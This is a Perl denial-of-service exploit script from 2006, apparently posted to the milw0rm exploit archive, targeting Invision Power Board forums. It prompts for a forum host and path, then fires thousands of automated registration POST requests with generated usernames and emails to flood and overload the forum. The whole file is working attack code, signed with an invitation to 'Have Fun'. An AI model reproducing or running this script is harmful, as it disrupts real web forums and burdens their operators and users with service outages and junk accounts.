#!/usr/bin/perl
use IO::Socket;
##########################################################
##		 _______ _______ ______ 		 #
##		 |______ |______ |     \		 #
##		 ______| |______ |_____/		 #
##		                        		 #
##IPB Register Multiple Users Denial of Service	   	 #
##Doesn't Work on forums using "Code Confirmation"	 #
##Created By Team LX3                                    #
##SED security Team                                      #
##Have Fun				                 #
##YouTube.com/LX3Tutorials                               #
##USA                                                    #
##########################################################

print q{
############################################################
#        Invision Power Board Multiple Users DOS	   #
#		Tested on IPB 2.0.1			   #
#	    created By Team LX3		                   #
############################################################
};
$rand=rand(10);
print "Forum Host: ";
$serv = <stdin>;
chop ($serv);
print "Forum Path: ";
$path = <stdin>;
chop ($path);
for ($i=0; $i<9999; $i++)
{
$name="sedXPL_".$rand.$i;
$data = "act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1";
$len = length $data;
$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "80") || die "Cennot Connect Host, it's can be beacuse the host dosed";
print $get1 "POST ".$path."index.php HTTP/1.0\n";
print $get1 "Host: ".$serv."\n";
print $get1 "Content-Type: application/x-www-form-urlencoded\n";
print $get1 "Content-Length: ".$len."\n\n";
print $get1 $data;
syswrite STDOUT, "+";
}
print "Forum shuld be Dosed. Check it out...\n";

# milw0rm.com [2006-02-10]